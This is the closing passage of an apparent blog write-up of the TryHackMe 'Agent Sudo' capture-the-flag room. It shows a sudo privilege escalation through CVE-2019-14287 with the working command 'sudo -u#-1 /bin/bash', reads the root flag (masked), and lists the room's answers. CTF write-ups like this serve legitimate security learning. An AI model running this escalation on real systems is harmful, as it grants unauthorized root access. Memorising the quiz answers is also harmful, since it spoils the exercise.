</span></span><span style="display:flex;"><span>    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User james may run the following commands on agent-sudo:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>ALL, !root<span style="color:#f92672">)</span> /bin/bash
</span></span></code></pre></div><p>We can see that james can run sudo as ALL, but <em>not</em> root.</p>
<p>Next, we&rsquo;ll check the version of sudo as on older versions it can be made to bypass this restriction.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo -V
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Sudo version 1.8.21p2
</span></span><span style="display:flex;"><span>Sudoers policy plugin version 1.8.21p2
</span></span><span style="display:flex;"><span>Sudoers file grammar version <span style="color:#ae81ff">46</span>
</span></span><span style="display:flex;"><span>Sudoers I/O plugin version 1.8.21p2
</span></span></code></pre></div><p>Luckily this version is vulnerable to the bug, where calling sudo with a user id of &ldquo;-1&rdquo; automatically resolves to &ldquo;0&rdquo;, or root.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo -u#-1 /bin/bash
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>whoami
</span></span><span style="display:flex;"><span>root
</span></span></code></pre></div><p>Success! Now with root access we can find and print the root flag!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -name root.txt
</span></span><span style="display:flex;"><span>/root/root.txt
</span></span><span style="display:flex;"><span>cat /root/root.txt
</span></span></code></pre></div><pre tabindex="0"><code>To Mr.hacker,

Congratulation on rooting this box. 
This box was designed for TryHackMe. 
Tips, always update your machine. 

Your flag is
********************************

By,
DesKel a.k.a Agent R
</code></pre><hr>
<h2 id="success">Success!</h2>
<p>We&rsquo;ve found both flags! (And Agent R&rsquo;s real name!)
If you search CVE for the string &ldquo;sudo runas ALL&rdquo; you&rsquo;ll find the number for the vulnerability.</p>
<blockquote>
<p>CVE number for the escalation?<br>
<em>CVE-2019-14287</em>.</p>
</blockquote>
<blockquote>
<p>What is the root flag?<br>
<code>********************************</code>.</p>
</blockquote>
<blockquote>
<p>(Bonus) Who is Agent R?<br>
<em>DesKel</em>.</p>
</blockquote>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p>It&rsquo;s possible (and faster in this case) to iterate through the alphabet manually <em>IF</em> you use a browser other than Firefox.&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>

    </div>
    <div class="post-footer">
      
    </div>
  </article>

    </main>
  </body>
</html>
